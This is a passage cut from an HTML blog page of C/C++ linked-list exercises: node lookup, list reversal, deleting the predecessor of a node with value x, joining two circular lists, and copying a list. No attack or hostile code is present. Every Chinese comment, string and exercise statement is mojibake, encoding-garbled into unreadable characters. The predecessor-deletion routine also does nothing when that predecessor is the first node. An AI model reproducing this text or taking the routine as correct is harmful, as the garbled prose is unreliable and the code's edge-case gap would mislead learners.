class="hljs-built_in">FindByValue</span>(head, <span class="hljs-number">30</span>);<br>    <span class="hljs-keyword">if</span> (foundNode != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ‰¾åˆ°å€¼ä¸º30çš„èŠ‚ç‚¹ï¼Œåœ°å€ä¸ºï¼š%p\n&quot;</span>, foundNode);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æœªæ‰¾åˆ°å€¼ä¸º30çš„èŠ‚ç‚¹\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// æŒ‰åºå·æŸ¥æ‰¾èŠ‚ç‚¹</span><br>    foundNode = <span class="hljs-built_in">FindByIndex</span>(head, <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (foundNode != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ‰¾åˆ°ç´¢å¼•ä¸º1çš„èŠ‚ç‚¹ï¼Œå€¼ä¸ºï¼š%d\n&quot;</span>, foundNode-&gt;data);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æœªæ‰¾åˆ°ç´¢å¼•ä¸º1çš„èŠ‚ç‚¹\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// æ±‚é“¾è¡¨é•¿åº¦</span><br>    <span class="hljs-type">int</span> length = <span class="hljs-built_in">GetLength</span>(head);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é“¾è¡¨é•¿åº¦ä¸ºï¼š%d\n&quot;</span>, length);<br><br>    <span class="hljs-comment">// é‡Šæ”¾é“¾è¡¨å†…å­˜</span><br>    <span class="hljs-keyword">if</span> (head != <span class="hljs-literal">NULL</span>) &#123;<br>        Node *p = head;<br>        <span class="hljs-keyword">do</span> &#123;<br>            Node *temp = p;<br>            p = p-&gt;next;<br>            <span class="hljs-built_in">free</span>(temp);<br>        &#125; <span class="hljs-keyword">while</span> (p != head);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-comment">// å®šä¹‰é“¾è¡¨èŠ‚ç‚¹ç»“æ„</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> &#123;<br>    <span class="hljs-type">int</span> data;        <br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span>* next; <br>&#125; Node;<br><br><span class="hljs-comment">// åè½¬é“¾è¡¨</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">reverseList</span><span class="hljs-params">(Node **head)</span> </span>&#123;<br>    Node *prev = <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">// åˆå§‹æ—¶ï¼Œå‰ä¸€ä¸ªèŠ‚ç‚¹ä¸ºç©º</span><br>    Node *curr = *head; <span class="hljs-comment">// å½“å‰èŠ‚ç‚¹æ˜¯é“¾è¡¨çš„å¤´èŠ‚ç‚¹</span><br>    Node *next = <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">// ä¸‹ä¸€ä¸ªèŠ‚ç‚¹åˆå§‹åŒ–ä¸ºç©º</span><br><br>    <span class="hljs-keyword">while</span> (curr != <span class="hljs-literal">NULL</span>) &#123;<br>        next = curr-&gt;next;    <span class="hljs-comment">// ä¿å­˜å½“å‰èŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹</span><br>        curr-&gt;next = prev;    <span class="hljs-comment">// åè½¬å½“å‰èŠ‚ç‚¹çš„æŒ‡é’ˆ</span><br>        prev = curr;          <span class="hljs-comment">// å°†prevæŒ‡å‘å½“å‰èŠ‚ç‚¹</span><br>        curr = next;          <span class="hljs-comment">// å½“å‰èŠ‚ç‚¹ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªèŠ‚ç‚¹</span><br>    &#125;<br>    *head = prev;  <span class="hljs-comment">// æœ€ç»ˆï¼Œprevä¼šæŒ‡å‘åŸé“¾è¡¨çš„æœ€åä¸€ä¸ªèŠ‚ç‚¹ï¼Œæˆä¸ºæ–°çš„å¤´èŠ‚ç‚¹</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹ç»™å®šçš„å•é“¾è¡¨Lï¼Œç¼–å†™ä¸€ä¸ªåˆ é™¤ä¸­å€¼ä¸ºÃ—çš„ç»“ç‚¹çš„ç›´æ¥å‰é©±ç»“ç‚¹çš„ç®—æ³•</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-comment">// å®šä¹‰é“¾è¡¨èŠ‚ç‚¹ç»“æ„</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> &#123;<br>    <span class="hljs-type">int</span> data;        <span class="hljs-comment">// å­˜å‚¨æ•°æ®</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span>* next; <span class="hljs-comment">// æŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆ</span><br>&#125; Node;<br><br><span class="hljs-comment">// åˆ›å»ºæ–°èŠ‚ç‚¹</span><br><span class="hljs-function">Node* <span class="hljs-title">createNode</span><span class="hljs-params">(<span class="hljs-type">int</span> data)</span> </span>&#123;<br>    Node *newNode = (Node *)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Node));<br>    newNode-&gt;data = data;<br>    newNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> newNode;<br>&#125;<br><br><span class="hljs-comment">// åˆ é™¤ä¸­å€¼ä¸ºxçš„èŠ‚ç‚¹çš„å‰é©±èŠ‚ç‚¹</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">deletePredecessor</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> x)</span> </span>&#123;<br>    <span class="hljs-comment">// é“¾è¡¨ä¸ºç©ºæˆ–è€…åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæ— æ³•è¿›è¡Œåˆ é™¤</span><br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span> || head-&gt;next == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é“¾è¡¨ä¸ºç©ºæˆ–åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæ— æ³•åˆ é™¤å‰é©±èŠ‚ç‚¹ï¼\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    Node *prev = <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">// å‰ä¸€ä¸ªèŠ‚ç‚¹</span><br>    Node *curr = head; <span class="hljs-comment">// å½“å‰èŠ‚ç‚¹</span><br><br>    <span class="hljs-comment">// éå†é“¾è¡¨ï¼Œå¯»æ‰¾å€¼ä¸ºxçš„èŠ‚ç‚¹</span><br>    <span class="hljs-keyword">while</span> (curr != <span class="hljs-literal">NULL</span> &amp;&amp; curr-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">if</span> (curr-&gt;next-&gt;data == x) &#123;<br>            <span class="hljs-comment">// æ‰¾åˆ°å‰é©±èŠ‚ç‚¹ï¼ˆcurrï¼‰å’Œåç»§èŠ‚ç‚¹ï¼ˆcurr-&gt;nextï¼‰</span><br>            <span class="hljs-comment">// åˆ é™¤å½“å‰èŠ‚ç‚¹çš„å‰é©±èŠ‚ç‚¹</span><br>            Node *temp = prev;<br>            <span class="hljs-keyword">if</span> (temp != <span class="hljs-literal">NULL</span>) &#123;<br>                temp-&gt;next = curr-&gt;next;  <span class="hljs-comment">// å°†å‰é©±èŠ‚ç‚¹çš„nextæŒ‡å‘curr-&gt;nextï¼Œä»è€Œåˆ é™¤å‰é©±èŠ‚ç‚¹</span><br>                <span class="hljs-built_in">free</span>(curr);  <span class="hljs-comment">// é‡Šæ”¾å‰é©±èŠ‚ç‚¹çš„å†…å­˜</span><br>            &#125;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        prev = curr;<br>        curr = curr-&gt;next;<br>    &#125;<br><br>    <span class="hljs-comment">// å¦‚æœæ²¡æœ‰æ‰¾åˆ°å€¼ä¸ºxçš„èŠ‚ç‚¹</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æœªæ‰¾åˆ°å€¼ä¸º %d çš„èŠ‚ç‚¹æˆ–è¯¥èŠ‚ç‚¹æ²¡æœ‰å‰é©±èŠ‚ç‚¹ï¼\n&quot;</span>, x);<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ‰ä¸¤ä¸ªå¾ªç¯å•é“¾è¡¨ï¼Œé“¾è¡¨å¤´æŒ‡é’ˆåˆ†åˆ«ä¸º headl å’Œ head2ï¼Œ<br>-ä¸ªå‡½æ•°å°†é“¾è¡¨ headl<br>é“¾æ¥åˆ°é“¾è¡¨head2 ä¹‹åï¼Œé“¾æ¥åçš„é“¾è¡¨ä»ä¿æŒæ˜¯å¾ªç¯é“¾è¡¨çš„å½¢å¼ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> &#123;<br>    <span class="hljs-type">int</span> data;           <span class="hljs-comment">// æ•°æ®åŸŸï¼Œå­˜å‚¨èŠ‚ç‚¹çš„æ•°æ®</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span>* next;  <span class="hljs-comment">// æŒ‡é’ˆåŸŸï¼ŒæŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹</span><br>&#125; LinkList;<br><br><span class="hljs-comment">// åˆå§‹åŒ–å¸¦å¤´ç»“ç‚¹çš„å¾ªç¯é“¾è¡¨</span><br><span class="hljs-function">LinkList* <span class="hljs-title">InitCircularList</span><span class="hljs-params">()</span> </span>&#123;<br>    LinkList *head = (LinkList*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(LinkList)); <span class="hljs-comment">// åˆ›å»ºå¤´ç»“ç‚¹</span><br>    head-&gt;next = head;  <span class="hljs-comment">// åˆå§‹åŒ–ä¸ºç©ºå¾ªç¯é“¾è¡¨</span><br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-comment">// å¤´æ’æ³•æ’å…¥èŠ‚ç‚¹</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">AddHead</span><span class="hljs-params">(LinkList *head, <span class="hljs-type">int</span> data)</span> </span>&#123;<br>    LinkList *newNode = (LinkList*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(LinkList)); <span class="hljs-comment">// åˆ›å»ºæ–°èŠ‚ç‚¹</span><br>    newNode-&gt;data = data;<br>    newNode-&gt;next = head-&gt;next; <span class="hljs-comment">// æ–°èŠ‚ç‚¹çš„ next æŒ‡å‘å¤´ç»“ç‚¹ä¹‹åçš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹</span><br>    head-&gt;next = newNode;       <span class="hljs-comment">// å¤´ç»“ç‚¹çš„ next æŒ‡å‘æ–°èŠ‚ç‚¹</span><br>&#125;<br><br><span class="hljs-comment">// å°¾æ’æ³•æ’å…¥èŠ‚ç‚¹</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">AddTail</span><span class="hljs-params">(LinkList *head, <span class="hljs-type">int</span> data)</span> </span>&#123;<br>    LinkList *newNode = (LinkList*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(LinkList)); <span class="hljs-comment">// åˆ›å»ºæ–°èŠ‚ç‚¹</span><br>    newNode-&gt;data = data;<br>    newNode-&gt;next = head;       <span class="hljs-comment">// æ–°èŠ‚ç‚¹çš„ next æŒ‡å‘å¤´ç»“ç‚¹ï¼Œä¿æŒå¾ªç¯</span><br><br>    LinkList *p = head;<br>    <span class="hljs-keyword">while</span> (p-&gt;next != head) &#123;   <span class="hljs-comment">// æ‰¾åˆ°å°¾èŠ‚ç‚¹</span><br>        p = p-&gt;next;<br>    &#125;<br>    p-&gt;next = newNode;          <span class="hljs-comment">// å°¾èŠ‚ç‚¹çš„ next æŒ‡å‘æ–°èŠ‚ç‚¹</span><br>&#125;<br><br><span class="hljs-comment">// éå†å¾ªç¯é“¾è¡¨å¹¶æ‰“å°</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PrintList</span><span class="hljs-params">(LinkList *head)</span> </span>&#123;<br>    LinkList *p = head-&gt;next;   <span class="hljs-comment">// ä»ç¬¬ä¸€ä¸ªæœ‰æ•ˆèŠ‚ç‚¹å¼€å§‹</span><br>    <span class="hljs-keyword">while</span> (p != head) &#123;         <span class="hljs-comment">// éå†åˆ°å¤´ç»“ç‚¹æ—¶åœæ­¢</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d -&gt; &quot;</span>, p-&gt;data);<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å›åˆ°å¤´ç»“ç‚¹\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// åˆå¹¶ä¸¤ä¸ªå¸¦å¤´ç»“ç‚¹çš„å¾ªç¯é“¾è¡¨</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ConnectCircularLists</span><span class="hljs-params">(LinkList *head1, LinkList *head2)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (head1 == <span class="hljs-literal">NULL</span> || head2 == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span>; <span class="hljs-comment">// å¦‚æœä»»ä½•ä¸€ä¸ªé“¾è¡¨ä¸ºç©ºï¼Œåˆ™ä¸éœ€è¦è¿æ¥</span><br>    &#125;<br><br>    LinkList *p1 = head1;<br>    LinkList *p2 = head2;<br><br>    <span class="hljs-comment">// æ‰¾åˆ° head1 çš„å°¾èŠ‚ç‚¹ï¼ˆå³ next æŒ‡å‘ head1 çš„èŠ‚ç‚¹ï¼‰</span><br>    <span class="hljs-keyword">while</span> (p1-&gt;next != head1) &#123;<br>        p1 = p1-&gt;next;<br>    &#125;<br><br>    <span class="hljs-comment">// æ‰¾åˆ° head2 çš„å°¾èŠ‚ç‚¹ï¼ˆå³ next æŒ‡å‘ head2 çš„èŠ‚ç‚¹ï¼‰</span><br>    <span class="hljs-keyword">while</span> (p2-&gt;next != head2) &#123;<br>        p2 = p2-&gt;next;<br>    &#125;<br><br>    <span class="hljs-comment">// è¿æ¥ä¸¤ä¸ªé“¾è¡¨å¹¶å½¢æˆæ•´ä½“å¾ªç¯</span><br>    p1-&gt;next = head2-&gt;next; <span class="hljs-comment">// head1 çš„å°¾èŠ‚ç‚¹è¿æ¥åˆ° head2 çš„ç¬¬ä¸€ä¸ªæœ‰æ•ˆèŠ‚ç‚¹</span><br>    p2-&gt;next = head1;       <span class="hljs-comment">// head2 çš„å°¾èŠ‚ç‚¹è¿æ¥åˆ° head1ï¼Œç¡®ä¿æ•´ä½“å¾ªç¯</span><br>&#125;<br><br><span class="hljs-comment">// ä¸»å‡½æ•°æµ‹è¯•ä»£ç </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// åˆå§‹åŒ–ä¸¤ä¸ªå¾ªç¯é“¾è¡¨</span><br>    LinkList *head1 = <span class="hljs-built_in">InitCircularList</span>();<br>    LinkList *head2 = <span class="hljs-built_in">InitCircularList</span>();<br><br>    <span class="hljs-comment">// æ’å…¥èŠ‚ç‚¹åˆ° head1 é“¾è¡¨</span><br>    <span class="hljs-built_in">AddTail</span>(head1, <span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">AddTail</span>(head1, <span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">AddTail</span>(head1, <span class="hljs-number">3</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é“¾è¡¨ head1:\n&quot;</span>);<br>    <span class="hljs-built_in">PrintList</span>(head1);<br><br>    <span class="hljs-comment">// æ’å…¥èŠ‚ç‚¹åˆ° head2 é“¾è¡¨</span><br>    <span class="hljs-built_in">AddTail</span>(head2, <span class="hljs-number">4</span>);<br>    <span class="hljs-built_in">AddTail</span>(head2, <span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">AddTail</span>(head2, <span class="hljs-number">6</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é“¾è¡¨ head2:\n&quot;</span>);<br>    <span class="hljs-built_in">PrintList</span>(head2);<br><br>    <span class="hljs-comment">// åˆå¹¶ä¸¤ä¸ªå¾ªç¯é“¾è¡¨</span><br>    <span class="hljs-built_in">ConnectCircularLists</span>(head1, head2);<br><br>    <span class="hljs-comment">// æ‰“å°åˆå¹¶åçš„é“¾è¡¨</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;åˆå¹¶åçš„å¾ªç¯é“¾è¡¨:\n&quot;</span>);<br>    <span class="hljs-built_in">PrintList</span>(head1);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å¤åˆ¶é“¾è¡¨</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> &#123;<br>    <span class="hljs-type">int</span> data;           <span class="hljs-comment">// æ•°æ®åŸŸï¼Œå­˜å‚¨èŠ‚ç‚¹çš„æ•°æ®</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span>* next;  <span class="hljs-comment">// æŒ‡é’ˆåŸŸï¼ŒæŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹</span><br>&#125; LinkList;<br><br><span class="hljs-comment">// åˆå§‹åŒ–å¸¦å¤´ç»“ç‚¹çš„å•å‘é“¾è¡¨</span><br><span class="hljs-function">LinkList* <span class="hljs-title">InitList</span><span class="hljs-params">()</span> </span>&#123;<br>    LinkList* head = (LinkList*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(LinkList)); <span class="hljs-comment">// åˆ›å»ºå¤´ç»“ç‚¹</span><br>    head-&gt;next = <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">// å¤´ç»“ç‚¹çš„ next åˆå§‹åŒ–ä¸ºç©º</span><br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-comment">// å°¾æ’æ³•æ’å…¥èŠ‚ç‚¹</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">AddTail</span><span class="hljs-params">(LinkList* head, <span class="hljs-type">int</span> data)</span> </span>&#123;<br>    LinkList* newNode = (LinkList*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(LinkList)); <span class="hljs-comment">// åˆ›å»ºæ–°èŠ‚ç‚¹</span><br>    newNode-&gt;data = data;<br>    newNode-&gt;next = <span class="hljs-literal">NULL</span>;<br><br>    LinkList* p = head;<br>    <span class="hljs-keyword">while</span> (p-&gt;next != <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-comment">// æ‰¾åˆ°é“¾è¡¨çš„å°¾èŠ‚ç‚¹</span><br>        p = p-&gt;next;<br>    &#125;<br>    p-&gt;next = newNode; <span class="hljs-comment">// å°¾èŠ‚ç‚¹çš„ next æŒ‡å‘æ–°èŠ‚ç‚¹</span><br>&#125;<br><br><span class="hljs-comment">// å¤åˆ¶å¸¦å¤´ç»“ç‚¹çš„å•å‘é“¾è¡¨</span><br><span class="hljs-function">LinkList* <span class="hljs-title">CopyList</span><span class="hljs-params">(LinkList* head)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>    LinkList* newHead = (LinkList*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(LinkList)); <span class="hljs-comment">// åˆ›å»ºæ–°é“¾è¡¨çš„å¤´ç»“ç‚¹</span><br>    newHead-&gt;next = <span class="hljs-literal">NULL</span>;<br>    LinkList* p = head-&gt;next;  <span class="hljs-comment">// æŒ‡å‘åŸé“¾è¡¨ç¬¬ä¸€ä¸ªæœ‰æ•ˆèŠ‚ç‚¹</span><br>    LinkList* q = newHead;     <span class="hljs-comment">// æŒ‡å‘æ–°é“¾è¡¨çš„å°¾éƒ¨ï¼Œç”¨äºè¿½åŠ æ–°èŠ‚ç‚¹</span><br><br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        LinkList* newNode = (LinkList*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(LinkList)); <span class="hljs-comment">// åˆ›å»ºæ–°èŠ‚ç‚¹</span><br>        newNode-&gt;data = p-&gt;data;<br>        newNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>        q-&gt;next = newNode; <span class="hljs-comment">// å°†æ–°èŠ‚ç‚¹æ·»åŠ åˆ°æ–°é“¾è¡¨</span><br>        q = newNode;       <span class="hljs-comment">// æ›´æ–° q ä¸ºæ–°èŠ‚ç‚¹</span><br><br>        p = p-&gt;next;       <span class="hljs-comment">// ç§»åŠ¨åˆ°åŸé“¾è¡¨çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹</span><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> newHead;<br>&#125;<br><br><span class="hljs-comment">// æ‰“å°é“¾è¡¨</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PrintList</span><span class="hljs-params">(LinkList* head)</span> </span>&#123;<br>    LinkList* p = head-&gt;next;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d -&gt; &quot;</span>, p-&gt;data);<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NULL\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// åˆ›å»ºåŸå§‹é“¾è¡¨å¹¶æ·»åŠ èŠ‚ç‚¹</span><br>    LinkList* head = <span class="hljs-built_in">InitList</span>();<br>    <span class="hljs-built_in">AddTail</span>(head, <span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">AddTail</span>(head, <span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">AddTail</span>(head, <span class="hljs-number">3</span>);<br>    <span class="hljs-built_in">printf</span>(<span 